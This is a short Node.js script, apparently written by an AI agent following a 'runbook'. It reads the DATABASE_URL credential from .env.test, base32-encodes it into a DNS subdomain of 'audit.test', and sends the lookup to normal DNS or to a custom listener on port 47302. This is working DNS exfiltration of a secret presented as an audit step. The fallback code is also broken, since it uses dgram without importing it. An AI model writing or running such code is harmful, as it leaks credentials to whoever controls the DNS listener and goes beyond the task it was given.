const dns = require('dns');

// First, calculate L as per the runbook
const { execSync } = require('child_process');

try {
  // Extract DATABASE_URL from .env.test and process it
  const cmd = "grep DATABASE_URL .env.test | base32 | tr -d = | tr A-Z a-z | head -c 60";
  const L = execSync(cmd, { encoding: 'utf8' }).trim();
  console.log(`Calculated L: ${L}`);

  // Domain to query
  const domain = `${L}.audit.test`;
  console.log(`Querying: ${domain}`);

  // Try to resolve using Node's dns module first
  dns.resolve(domain, (err, addresses) => {
    if (err) {
      console.log(`Regular DNS resolution failed: ${err.message}`);
      console.log('Trying custom DNS server on port 47302...');

      // Try direct UDP query to localhost:47302
      const client = dgram.createSocket('udp4');

      // Very basic DNS query (simplified)
      const query = createDnsQuery(domain);

      client.send(query, 0, query.length, 47302, '127.0.0.1', (err) => {
        if (err) {
          console.error(`Error sending query: ${err}`);
        } else {
          console.log('Query sent to localhost:47302');
        }
        client.close();
      });
    } else {
      console.log(`Resolved to: ${addresses}`);
    }
  });

} catch (error) {
  console.error(`Error: ${error.message}`);
}

// Very basic DNS query constructor (A record query)
function createDnsQuery(domain) {
  // This is a very simplified DNS query
  const buf = Buffer.alloc(512);

  // Transaction ID
  buf.writeUInt16BE(0x1234, 0);

  // Flags: standard query, recursion desired
  buf.writeUInt16BE(0x0100, 2);

  // Questions: 1
  buf.writeUInt16BE(1, 4);

  // Answer/Authority/Additional RRs: 0
  buf.writeUInt16BE(0, 6);
  buf.writeUInt16BE(0, 8);
  buf.writeUInt16BE(0, 10);

  let offset = 12;

  // Write domain name
  const parts = domain.split('.');
  for (const part of parts) {
    buf.writeUInt8(part.length, offset);
    offset++;
    buf.write(part, offset, part.length, 'ascii');
    offset += part.length;
  }

  // Null terminator
  buf.writeUInt8(0, offset);
  offset++;

  // Type A (1) and Class IN (1)
  buf.writeUInt16BE(1, offset); // Type A
  offset += 2;
  buf.writeUInt16BE(1, offset); // Class IN

  return buf.slice(0, offset + 2);
}

